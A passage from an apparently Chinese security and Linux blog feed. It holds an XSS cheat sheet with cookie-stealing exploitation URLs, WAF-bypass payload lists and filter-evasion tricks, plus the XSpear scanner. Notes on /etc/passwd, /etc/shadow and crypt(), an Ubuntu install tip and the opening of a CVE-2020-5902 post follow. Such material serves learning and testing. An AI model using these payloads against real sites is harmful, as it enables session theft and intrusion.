&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;示例: &amp;lt;script&amp;gt; ... setTimeout(\&quot;writetitle()\&quot;,$_GET[xss]) ... &amp;lt;/script&amp;gt;

利用: /?xss=500); alert(document.cookie);//
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;基于dom的xss&quot;&gt;基于DOM的XSS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;示例: &amp;lt;script&amp;gt; ... eval($_GET[xss]); ... &amp;lt;/script&amp;gt;

利用: /?xss=document.cookie
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;通过请求重定向构造xss&quot;&gt;&lt;strong&gt;通过请求重定向构造XSS&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;存在漏洞代码:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    ...

     header('Location: '.$_GET['param']);

    ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样包括:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;    ...

     header('Refresh: 0; URL='.$_GET['param']);

    ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种请求不会绕过WAF:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;/?param=javascript:alert(document.cookie)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种请求可以绕过WAF并且XSS攻击可以在某些浏览器执行:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;/?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;绕过&lt;/strong&gt;WAF可用&lt;strong&gt;字符串.&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;    &amp;lt;Img src = x onerror = &quot;javascript: window.onerror = alert; throw XSS&quot;&amp;gt;

    &amp;lt;Video&amp;gt; &amp;lt;source onerror = &quot;javascript: alert (XSS)&quot;&amp;gt;

    &amp;lt;Input value = &quot;XSS&quot; type = text&amp;gt;

    &amp;lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&amp;gt;

    &amp;lt;isindex x=&quot;javascript:&quot; onmouseover=&quot;alert(XSS)&quot;&amp;gt;

    &quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;”&amp;gt;’&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(String.fromCharCode(88,83,83))&amp;lt;/SCRIPT&amp;gt;

    &quot;&amp;gt;&amp;lt;img src=&quot;x:x&quot; onerror=&quot;alert(XSS)&quot;&amp;gt;

    &quot;&amp;gt;&amp;lt;iframe src=&quot;javascript:alert(XSS)&quot;&amp;gt;

    &amp;lt;object data=&quot;javascript:alert(XSS)&quot;&amp;gt;

    &amp;lt;isindex type=image src=1 onerror=alert(XSS)&amp;gt;

    &amp;lt;img src=x:alert(alt) onerror=eval(src) alt=0&amp;gt;

    &amp;lt;img  src=&quot;x:gif&quot; onerror=&quot;window['al\u0065rt'](0)&quot;&amp;gt;&amp;lt;/img&amp;gt;

    &amp;lt;iframe/src=&quot;data:text/html,&amp;lt;svg onload=alert(1)&amp;gt;&quot;&amp;gt;

    &amp;lt;meta content=&quot;&amp;amp;NewLine; 1 &amp;amp;NewLine;; JAVASCRIPT&amp;amp;colon; alert(1)&quot; http-equiv=&quot;refresh&quot;/&amp;gt;

    &amp;lt;svg&amp;gt;&amp;lt;script xlink:href=data&amp;amp;colon;,window.open('https://www.google.com/')&amp;gt;&amp;lt;/script

    &amp;lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:confirm(1)&quot;&amp;gt;

    &amp;lt;iframe src=javascript&amp;amp;colon;alert&amp;amp;lpar;document&amp;amp;period;location&amp;amp;rpar;&amp;gt;

    &amp;lt;form&amp;gt;&amp;lt;a href=&quot;javascript:\u0061lert(1)&quot;&amp;gt;X

    &amp;lt;/script&amp;gt;&amp;lt;img/*%00/src=&quot;worksinchrome&amp;amp;colon;prompt(1)&quot;/%00*/onerror='eval(src)'&amp;gt;

    &amp;lt;style&amp;gt;//*{x:expression(alert(/xss/))}//&amp;lt;style&amp;gt;&amp;lt;/style&amp;gt; 

    On Mouse Over​

    &amp;lt;img src=&quot;/&quot; =_=&quot; title=&quot;onerror='prompt(1)'&quot;&amp;gt;

    &amp;lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;amp;#97v&amp;amp;#97script:&amp;amp;#97lert(1)&amp;gt;ClickMe

    &amp;lt;script x&amp;gt; alert(1) &amp;lt;/script 1=2

    &amp;lt;form&amp;gt;&amp;lt;button formaction=javascript&amp;amp;colon;alert(1)&amp;gt;CLICKME

    &amp;lt;input/onmouseover=&quot;javaSCRIPT&amp;amp;colon;confirm&amp;amp;lpar;1&amp;amp;rpar;&quot;

    &amp;lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;alert混淆以绕过过滤器&quot;&gt;Alert混淆以绕过过滤器&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;(alert)(1)

a=alert,a(1)

[1].find(alert)

top[“al”+”ert”](1)

top[/al/.source+/ert/.source](1)

al\u0065rt(1)

top[‘al\145rt’](1)

top[‘al\x65rt’](1)

top[8680439..toString(30)](1)
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;xss扫描工具&quot;&gt;xss扫描工具&lt;/h1&gt;

&lt;p&gt;xspear&lt;/p&gt;

&lt;p&gt;安装:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gem install XSpear
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;需要root用户&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;基础用法&quot;&gt;基础用法&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Usage: xspear -u [target] -[options] [value]
[ e.g ]
$ xspear -u 'https://www.hahwul.com/?q=123' --cookie='role=admin' -v 1 -a 
$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2
$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 0 -o json

[ Options ]
    -u, --url=target_URL             [required] Target Url
    -d, --data=POST Body             [optional] POST Method Body data
    -a, --test-all-params            [optional] test to all params(include not reflected)
        --no-xss                     [optional] no testing xss, only parameters analysis
        --headers=HEADERS            [optional] Add HTTP Headers
        --cookie=COOKIE              [optional] Add Cookie
        --custom-payload=FILENAME    [optional] Load custom payload json file
        --raw=FILENAME               [optional] Load raw file(e.g raw_sample.txt)
        --raw-ssl=BOOLEAN            [optional] http/https switch for burp raw file e.g: true/false
    -p, --param=PARAM                [optional] Test paramters
    -b, --BLIND=URL                  [optional] Add vector of Blind XSS
                                      + with XSS Hunter, ezXSS, HBXSS, etc...
                                      + e.g : -b https://hahwul.xss.ht
    -t, --threads=NUMBER             [optional] thread , default: 10
    -o, --output=FORMAT              [optional] Output format (cli , json, html)
    -c, --config=FILENAME            [optional] Using config.json
    -v, --verbose=0~3                [optional] Show log depth
                                      + v=0 : quite mode(only result)
                                      + v=1 : show scanning status(default)
                                      + v=2 : show scanning logs
                                      + v=3 : show detail log(req/res)
    -h, --help                       Prints this help
        --version                    Show XSpear version
        --update                     Show how to update

&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;xss防范&quot;&gt;xss防范&lt;/h1&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">passwd&amp;amp;shadow文件</title><link href="http://localhost:4000/_posts/2020-07-10-passwd&shadow%E6%96%87%E4%BB%B6/" rel="alternate" type="text/html" title="passwd&amp;shadow文件" /><published>2020-07-10T00:00:00-04:00</published><updated>2020-07-10T00:00:00-04:00</updated><id>http://localhost:4000/_posts/passwd&amp;shadow%E6%96%87%E4%BB%B6</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-10-passwd&amp;shadow%E6%96%87%E4%BB%B6/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;两文件均在&lt;code&gt;/etc&lt;/code&gt;目录下&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;passwd&quot;&gt;passwd&lt;/h1&gt;

&lt;p&gt;这个文件存放着所有用户帐号的信息，包括用户名和密码&lt;/p&gt;

&lt;p&gt;passwd文件由许多条记录组成，&lt;code&gt;每条记录占一行&lt;/code&gt;，记录了一个用户帐号的所有信息。每条记录由&lt;code&gt;7个字段&lt;/code&gt;组成，字段间用&lt;code&gt;冒号“：”隔开&lt;/code&gt;，其格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;username:password:User ID:Group ID:comment:home directory:shell
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;username:用户名 用户在登录时使用的就是它&lt;/li&gt;
  &lt;li&gt;password:该帐号的口令&lt;/li&gt;
  &lt;li&gt;User ID :用户识别码，简称UID,Linux系统内部使用UID来标识用户，而不是用户名&lt;/li&gt;
  &lt;li&gt;GROUP ID:用户组识别码，简称GID&lt;/li&gt;
  &lt;li&gt;comment :这是给用户帐号做的注解,可为空&lt;/li&gt;
  &lt;li&gt;home directory:主目录,这个目录属于该帐号，当用户登录后，它就会被置于此目录中，就像回到家一样。一般来说，root帐号的主目录是/root，其他帐号的家目录都在/home目录下，并且和用户名同名&lt;/li&gt;
  &lt;li&gt;shell :登录的shell&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;shadow&quot;&gt;shadow&lt;/h1&gt;

&lt;p&gt;为了增强系统的安全性，Linux系统还可以为用户提供MD5和Shadow安全密码服务。如果在安装 Linux 时在相关配置的选项上选中了MD5和Shadow服务，那么将看到的/etc/passwd文件里的passwd项上无论是什么用户，都是一个“x”，系统其实是把真正的密码数据放在了/etc/shadow文件里。/etc/shadow文件只能以root身份来浏览。&lt;/p&gt;

&lt;p&gt;格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;用户名：加密口令：上一次修改的时间（从1970年1月1日起的天数）：口令在两次修改间的最小天数：口令修改之前向用户发出警告的天数：口令终止后账号被禁用的天数：从1970年1月1日起账号被禁用的天数：保留域
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;在linux中，口令文件在/etc/passwd中，早期的这个文件直接存放加密后的密码，前两位是”盐”值，是一个随机数，后面跟的是加密的密码。为了安全，现在的linux都提供了 /etc/shadow这个影子文件，密码放在这个文件里面，并且是只有root可读的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;缺省账号&quot;&gt;缺省账号&lt;/h1&gt;

&lt;p&gt;在利用了shadow文件的情况下，密码用一个x表示，普通用户看不到任何密码信息。如果你仔细的看看这个文件，会发现一些奇怪的用户名，她们是系  统的缺省账号，缺省账号是攻击者入侵的常用入口，因此一定要熟悉缺省账号，特别要注意密码域是否为空。下面简单介绍一下这些缺省账号&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;adm拥有账号文件，起始目录/var/adm通常包括日志文件&lt;/li&gt;
  &lt;li&gt;bin拥有用户命令的可执行文件&lt;/li&gt;
  &lt;li&gt;daemon用来执行系统守护进程&lt;/li&gt;
  &lt;li&gt;games用来玩游戏&lt;/li&gt;
  &lt;li&gt;halt用来执行halt命令&lt;/li&gt;
  &lt;li&gt;lp拥有打印机后台打印文件&lt;/li&gt;
  &lt;li&gt;mail拥有与邮件相关的进程和文件&lt;/li&gt;
  &lt;li&gt;news拥有与usenet相关的进程和文件&lt;/li&gt;
  &lt;li&gt;nobody被NFS（网络文件系统）使用&lt;/li&gt;
  &lt;li&gt;shutdown执行shutdown命令&lt;/li&gt;
  &lt;li&gt;sync执行sync命令&lt;/li&gt;
  &lt;li&gt;uucp拥有uucp工具和文件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;/etc/passwd文件在很大范围内是可读的，因为许多应用程序需要用他来把UID转换为用户名，例如，如果不能访问/etc/passwd，那么ls -l命令将显示UID而不是用户名&lt;/p&gt;

&lt;h1 id=&quot;group补充&quot;&gt;group补充&lt;/h1&gt;

&lt;p&gt;etc/group  文件是用户组的配置文件，内容包括用户和用户组，并且能显示出用户是归属哪个用户组或哪几个用户组，因为一个用户可以归属一个或多个不同的用户组；同一用户组的用户之间具有相似的特征。比如我们把某一用户加入到root用户组，那么这个用户就可以浏览root用户家目录的文件，如果root用户把某个文件的读写执行权限开放，root用户组的所有用户都可以修改此文件，如果是可执行的文件（比如脚本），root用户组的用户也是可以执行的；用户组的特性在系统管理中为系统管理员提供了极大的方便，但安全性也是值得关注的，如某个用户下有对系统管理有最重要的内容，最好让用户拥有独立的用户组，或者是把用户下的文件的权限设置为完全私有；另外root用户组一般不要轻易把普通用户加入进去。&lt;/p&gt;

&lt;p&gt;格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;group_name:passwd:GID:user_list
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;group_name:用户组名称&lt;/li&gt;
  &lt;li&gt;passwd:用户组密码&lt;/li&gt;
  &lt;li&gt;GID:GID&lt;/li&gt;
  &lt;li&gt;user_list:用户列表，每个用户之间用,号分割；本字段可以为空；如果字段为空表示用户组为GID的用户名；&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;密码破解&quot;&gt;密码破解&lt;/h1&gt;

&lt;p&gt;参照此篇&lt;a href=&quot;/_posts/2019-03-13-Hydra&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;相关linux编程&quot;&gt;相关linux编程&lt;/h1&gt;

&lt;h2 id=&quot;函数介绍&quot;&gt;函数介绍&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;getpwuid&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;getpwnam&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;getpwnam, getpwnam_r, getpwuid, getpwuid_r - get password file entry&lt;/p&gt;
    &lt;/blockquote&gt;

    &lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;pwd.h&amp;gt;
struct passwd *getpwnam(const char *name);
struct passwd *getpwuid(uid_t uid);
int getpwnam_r(const char *name, struct passwd *pwd,
char *buf, size_t buflen, struct passwd **result);
int getpwuid_r(uid_t uid, struct passwd *pwd,
char *buf, size_t buflen, struct passwd **result);
Feature Test Macro Requirements for glibc (see feature_test_macros(7)):
getpwnam_r(), getpwuid_r():
_POSIX_C_SOURCE
|| /* Glibc versions &amp;lt;= 2.19: */ _BSD_SOURCE || _SVID_SOURCE
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;passwd结构体定义&lt;code&gt;&amp;lt;pwd.h&amp;gt;&lt;/code&gt;文件中，具体如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct passwd {
               char   *pw_name;       /* username */
               char   *pw_passwd;     /* user password */
               uid_t   pw_uid;        /* user ID */
               gid_t   pw_gid;        /* group ID */
               char   *pw_gecos;      /* user information */
               char   *pw_dir;        /* home directory */
               char   *pw_shell;      /* shell program */
           };
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;getgrgid&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;getgrgrnam&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;getgrnam, getgrnam_r, getgrgid, getgrgid_r - get group file entry&lt;/p&gt;
    &lt;/blockquote&gt;

    &lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;grp.h&amp;gt;
  
struct group *getgrnam(const char *name);
  
struct group *getgrgid(gid_t gid);
  
int getgrnam_r(const char *name, struct group *grp,
char *buf, size_t buflen, struct group **result);
  
int getgrgid_r(gid_t gid, struct group *grp,
char *buf, size_t buflen, struct group **result);
  
Feature Test Macro Requirements for glibc (see feature_test_macros(7)):
  
getgrnam_r(), getgrgid_r():
_POSIX_C_SOURCE
|| /* Glibc versions &amp;lt;= 2.19: */ _BSD_SOURCE || _SVID_SOURCE
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;group结构体定义&lt;code&gt;&amp;lt;group.h&amp;gt;&lt;/code&gt;文件中，具体如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct group {
               char   *gr_name;        /* group name */
               char   *gr_passwd;      /* group password */
               gid_t   gr_gid;         /* group ID */
               char  **gr_mem;         /* NULL-terminated array of pointers
                                          to names of group members */
           };
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;shadow密码部分解析&quot;&gt;shadow密码部分解析&lt;/h2&gt;

&lt;p&gt;案例：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;$6$/yP9fQlL$/2sALmuVqVSTCrBo5ObPl8v9cpOvSHX1dHOrAQORCNiB6fJc5.93po8RorRBWo1415wnOdd0EmNmgq.wpwYjE0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以&lt;em&gt;$&lt;/em&gt;符为分割，&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;$6$：表示加密方法&lt;/li&gt;
  &lt;li&gt;$/yP9fQlL$ :杂质串,需要原串或上这个杂质串,然后经过第一个&lt;em&gt;$&lt;/em&gt;间定义的加密方式进行加密,然后获得第三个&lt;em&gt;$&lt;/em&gt;间的内容&lt;/li&gt;
  &lt;li&gt;$/2sALmuVqVSTCrBo5ObPl8v9cpOvSHX1dHOrAQORCNiB6fJc5.93po8RorRBWo1415wnOdd0EmNmgq.wpwYjE0 :加密生成的&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;相关函数&quot;&gt;相关函数&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;getspnam&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;getspnam, getspnam_r, getspent, getspent_r, setspent, endspent, fgetspent, fgetspent_r, sgetspent,
  sgetspent_r, putspent, lckpwdf, ulckpwdf - get shadow password file entry&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;shadow.h&amp;gt;
struct spwd *getspnam(const char *name);
struct spwd *getspent(void);
void setspent(void);
void endspent(void);
struct spwd *fgetspent(FILE *stream);
struct spwd *sgetspent(const char *s);
int putspent(const struct spwd *p, FILE *stream);
int lckpwdf(void);
int ulckpwdf(void);
/* GNU extension */
#include &amp;lt;shadow.h&amp;gt;
int getspent_r(struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
int getspnam_r(const char *name, struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
int fgetspent_r(FILE *stream, struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
int sgetspent_r(const char *s, struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;相应结构体为于&lt;code&gt;&amp;lt;shadow.h&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct spwd {
               char *sp_namp;     /* Login name */
               char *sp_pwdp;     /* Encrypted password */
               long  sp_lstchg;   /* Date of last change
                                     (measured in days since
                                     1970-01-01 00:00:00 +0000 (UTC)) */
               long  sp_min;      /* Min # of days between changes */
               long  sp_max;      /* Max # of days between changes */
               long  sp_warn;     /* # of days before password expires
                                     to warn user to change it */
               long  sp_inact;    /* # of days after password expires
                                     until account is disabled */
               long  sp_expire;   /* Date when account expires
                                     (measured in days since
                                     1970-01-01 00:00:00 +0000 (UTC)) */
               unsigned long sp_flag;  /* Reserved */
           };
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;crypt&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;crypt, crypt_r - password and data encryption&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define _XOPEN_SOURCE       /* See feature_test_macros(7) */
#include &amp;lt;unistd.h&amp;gt;

char *crypt(const char *key, const char *salt);

#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include &amp;lt;crypt.h&amp;gt;

char *crypt_r(const char *key, const char *salt,
              struct crypt_data *data);
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;注意：编译时需要带上&lt;code&gt; -lcrypt.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;结合shadow文件密码部分，发现&lt;code&gt;crypt&lt;/code&gt;函数参数并没有定义加密方法，其实这个部分被整合到salt部分去了，参照如下：&lt;/p&gt;

&lt;p&gt;The glibc2 version of this function supports additional encryption algorithms.&lt;/p&gt;

&lt;p&gt;If salt is a character string starting with the characters “$id$” followed by a string  optionally
   terminated by “$”, then the result has the form:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;      $id$salt$encrypted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;id  identifies  the encryption method used instead of DES and this then determines how the rest of
   the password string is interpreted.  The following values of id are supported:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ID&lt;/th&gt;
      &lt;th&gt;Method&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;MD5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2a&lt;/td&gt;
      &lt;td&gt;Blowfish (not in mainline glibc; added in some Linux distributions)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;SHA-256&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;SHA-512&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Thus, $5$salt$encrypted and $6$salt$encrypted contain the password encrypted  with,  respectively,
   functions based on SHA-256 and SHA-512.&lt;/p&gt;

&lt;p&gt;“salt”  stands  for the up to 16 characters following “$id$” in the salt.  The “encrypted” part of
   the password string is the actual computed password.  The size of this string is fixed:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;MD5&lt;/td&gt;
      &lt;td&gt;22 characters&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SHA-256&lt;/td&gt;
      &lt;td&gt;43 characters&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SHA-512&lt;/td&gt;
      &lt;td&gt;86 characters&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The characters in “salt” and “encrypted” are drawn from the set [a-zA-Z0-9./].  In the MD5 and SHA
   implementations the entire key is significant (instead of only the first 8 bytes in DES).&lt;/p&gt;

&lt;p&gt;Since glibc 2.7, the SHA-256 and SHA-512 implementations support a user-supplied number of hashing
   rounds, defaulting to 5000.  If the “$id$” characters in the salt are followed  by  “rounds=xxx$”,
   where xxx is an integer, then the result has the form&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;      $id$rounds=yyy$salt$encrypted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;where  yyy  is  the number of hashing rounds actually used.  The number of rounds actually used is
   1000 if xxx is less than 1000, 999999999 if xxx is greater than 999999999, and  is  equal  to  xxx
   otherwise&lt;/p&gt;

&lt;p&gt;检测用户密码例子&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;代码不规范，没有做一些判断处理等细节&lt;/p&gt;

  &lt;p&gt;编译： gcc checkpass.c -lcrypt -D _XOPEN_SOURCE&lt;/p&gt;

  &lt;p&gt;注意需要用root用户去运行(需要访问shadow文件)，不然会有段错误&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;shadow.h&amp;gt;
int main(int argc,char ** argv[])
{
    char *input_pass;
    struct spwd *shadowline;
    char *crypt_pass;
    if(argc &amp;lt; 2)
    {
        fprintf(stderr,&quot;usage ...\n&quot;);
        exit(EXIT_SUCCESS);
    }
    //获取用户口令
    //关闭输入回显
    input_pass = getpass(&quot;PassWord:&quot;);
    shadowline =  getspnam(argv[1]);
    crypt_pass = crypt(input_pass,shadowline-&amp;gt;sp_pwdp);
    if(strcmp(shadowline-&amp;gt;sp_pwdp,crypt_pass) == 0)
    {
        puts(&quot;ok&quot;);
    }
    else
    {
        puts(&quot;error&quot;);
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry><entry><title type="html">ubuntu安装问题及后续配置</title><link href="http://localhost:4000/_posts/2020-07-08-ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE/" rel="alternate" type="text/html" title="ubuntu安装问题及后续配置" /><published>2020-07-08T00:00:00-04:00</published><updated>2020-07-08T00:00:00-04:00</updated><id>http://localhost:4000/_posts/ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-08-ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;镜像下载：&lt;a href=&quot;https://ubuntu.com/&quot;&gt;地址&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;win平台制作启动盘软件：软碟通&lt;/li&gt;
  &lt;li&gt;linux制作启动盘：dd命令：dd if=镜像位置 of= U盘挂载位置&lt;/li&gt;
  &lt;li&gt;设置BOIS引导启动，后安装，此处不赘述&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;安装中出现的问题&quot;&gt;安装中出现的问题&lt;/h1&gt;

&lt;h2 id=&quot;卡死&quot;&gt;卡死&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;卡死在logo界面等等&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一般是因为ubuntu自带nouveau显卡驱动，且是默认的驱动，与本机N卡冲突&lt;/p&gt;

&lt;p&gt;解决方法：&lt;/p&gt;

&lt;p&gt;在启动U盘时，当看到&lt;code&gt;Try Ubuntu ，Install Ubuntu&lt;/code&gt;时，按下&lt;code&gt;e&lt;/code&gt;键，把出现的文字中&lt;code&gt;quiet splash&lt;/code&gt;改为&lt;code&gt;nomodeset&lt;/code&gt;，然后按&lt;code&gt;F10&lt;/code&gt;重启&lt;/p&gt;

&lt;p&gt;后续即可进入桌面进行安装了&lt;/p&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry><entry><title type="html">cve-2020-5902</title><link href="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/" rel="alternate" type="text/html" title="cve-2020-5902" /><published>2020-07-06T00:00:00-04:00</published><updated>2020-07-06T00:00:00-04:00</updated><id>http://localhost:4000/_posts/cve-2020-5902</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-06-cve-2020-5902/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;code&gt;警告,用于学习,切勿做破坏,造成的后果本人概不负责&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;2020年07月03日， 360CERT监测发现 &lt;code&gt;F5&lt;/code&gt; 发布了 &lt;code&gt;F5 BIG-IP 远程代码执行&lt;/code&gt; 的风险通告，该漏洞编号为 &lt;code&gt;CVE-2020-5902&lt;/code&gt;，漏洞等级：&lt;code&gt;严重&lt;/code&gt;。&lt;/p&gt;

  &lt;p&gt;未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 &lt;code&gt;F5 BIG-IP&lt;/code&gt; 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;漏洞详情&quot;&gt;漏洞详情&lt;/h1&gt;

